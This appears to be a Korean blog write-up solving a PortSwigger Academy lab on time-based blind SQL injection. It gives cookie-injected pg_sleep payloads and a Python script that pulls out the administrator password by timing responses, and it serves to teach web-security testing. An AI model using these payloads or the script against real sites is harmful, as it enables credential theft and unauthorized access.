---
title: "[Write-up] PortSwigger Academy - Time-Based Blind SQL Injection Lab"
date: 2026-02-15 01:00:00 +09:00
categories: [Web, SQL Injection]
tag: [SQLi, Write-up, PortSwigger Academy]
---

### 문제 설명
![1](../assets/img/Time-Based%20Blind%20SQLi/1.png)  
- 애플리케이션은 Tracking Cookie 값을 포함한 SQL 쿼리를 수행한다.
- 쿼리 결과는 표시되지 않으며, 정상 응답과 에러 응답이 구분되지 않는다.
- 쿼리는 동기적으로 실행된다.
- 데이터베이스에는 users(username, password) 테이블이 존재한다.
- 목표 : administrator 계정의 패스워드를 추출하고 해당 계정으로 로그인

### 취약점 분석
LAB에 접속하면 다음과 같은 초기 페이지를 확인할 수 있다. My account 링크로 이동할 수 있는 로그인 페이지와 상품 카테고리 정렬 기능을 포함하고 있다. 또한 개발자 도구를 통해 `TrackingId` 쿠키를 사용 중인 것을 확인할 수 있다.
![2](../assets/img/Time-Based%20Blind%20SQLi/2.png)  
![3](../assets/img/Time-Based%20Blind%20SQLi/3.png)  

먼저 TrackingId 쿠키에 테스트 페이로드를 삽입해서 SQL Injection 취약점을 테스트했다.  
```sql
'
''
' AND 1=1--
' AND 1=2--
```
```sql
' AND SLEEP(5) --
'; WAITFOR DELAY '0:0:5' --
'; SELECT pg_sleep(5) --
' AND EXISTS(SELECT 1 FROM DUAL WHERE 1=1 AND dbms_lock.sleep(5)=0) --
```

에러 발생 여부 및 참/거짓 조건에 따른 응답의 차이는 확인되지 않았지만, pg_sleep() 함수를 사용했을 때 시간 지연이 발생하는 것을 확인할 수 있었다.

pg_sleep() 함수가 사용 가능한 것으로 대상 시스템이 PostgreSQL을 사용하고 있으며, 세미클론(;) 이후의 쿼리가 정상 실행되는 것으로 Stacked Query 실행이 가능함을 알 수 있다.
![4](../assets/img/Time-Based%20Blind%20SQLi/4.png)  

다음으로 조건문을 작성해서 참/거짓 조건에 따른 시간 지연을 테스트했다.  
```sql
'; SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END--
'; SELECT CASE WHEN 1=2 THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

참인 조건에서는 시간 지연이 발생했지만, 거짓 조건에서는 시간 지연이 발생하지 않는 것을 확인할 수 있다.  
이를 통해 조건에 따른 응답 시간 차이를 이용한 Time-Based Blind SQL Injection 취약점이 존재하는 것을 확인했고, 해당 취약점을 이용해 administrator 계정의 패스워드 추출을 시도했다.

### 공격 과정
(1) LENGTH() 조건 비교를 통한 패스워드 길이 확인  
```sql
'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)=1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)=2) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
...
```

(2) SUBSTR() 조건 비교를 통한 패스워드 문자열 추출  
```sql
'; SELECT CASE WHEN (username='administrator' AND SUBSTR(password, 1, 1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
'; SELECT CASE WHEN (username='administrator' AND SUBSTR(password, 1, 1)='b') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
...
'; SELECT CASE WHEN (username='administrator' AND SUBSTR(password, 2, 1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
'; SELECT CASE WHEN (username='administrator' AND SUBSTR(password, 2, 1)='b') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
...
```

(3) 패스워드 추출 자동화 스크립트 작성  
```python
import requests, time

session = requests.Session()

url = "https://0a7900690317992180e349cb00640084.web-security-academy.net/"

session.get(url)

print(session.cookies.get_dict()) # Cookie

cookie = session.cookies.get("TrackingId")
print("TrackingId : ", cookie)

length = 0
while True:
    query = f"'%3B SELECT CASE WHEN (username='administrator' AND LENGTH(password)={length}) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--"
    cookies = {
        "TrackingId" : cookie + query
    }
    start_time = time.time()
    response = session.get(url, cookies=cookies)
    end_time = time.time() - start_time
    if end_time > 3:
        break
    length += 1
   
print("Length : ", length)

password = ""
for i in range(1, length + 1):
    start = 1
    end = 127
    while start < end:
        mid = (start + end) // 2
        query = f"'%3B SELECT CASE WHEN (username='administrator' AND ASCII(SUBSTR(password, {i}, 1))>{mid}) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--"
        cookies = {
        "TrackingId" : cookie + query
        }
        start_time = time.time()
        response = session.get(url, cookies=cookies)
        end_time = time.time() - start_time

        if end_time > 3:
            start = mid
        else:
            end = mid

        if start + 1 >= end:
            password += chr(end)
            break

    print(f"Password : {password}") 
```

- 1~12번 라인  
세션 생성 후 쿠키 정보 획득, TrackingId 쿠키 값 출력

- 14~27번 라인  
패스워드 길이 확인 코드  
획득한 TrackingId 쿠키 값 뒤에 SQL 쿼리를 추가하여 요청을 전송한다. 이후 length 값을 증가시키며 요청을 반복하고, 요청 시간과 응답 시간의 차이가 3초 이상인 경우 반복문을 종료하고 패스워드 길이를 획득한다.

- 29번~52번 라인  
패스워드 문자열 추출 코드  
SUBSTR() 함수로 패스워드 문자열 특정 위치의 문자를 추출하고, 이진 탐색 알고리즘을 사용해 해당 문자의 ASCII 값을 획득한다.
획득한 ASCII 값을 chr() 함수를 통해 다시 문자로 변환한 뒤 password 변수에 추가하고, 이를 패스워드 길이만큼 반복해 전체 패스워드 문자열을 추출한다.

### 공격 결과
스크립트 실행 결과, 패스워드 길이 확인 및 패스워드 문자열 추출의 과정을 통해 administrator 계정의 전체 패스워드를 획득했다. 
획득한 계정 정보로 administrator 계정에 로그인하면 Lab이 해결된다.  
![5](../assets/img/Time-Based%20Blind%20SQLi/5.png)  
![6](../assets/img/Time-Based%20Blind%20SQLi/6.png)  
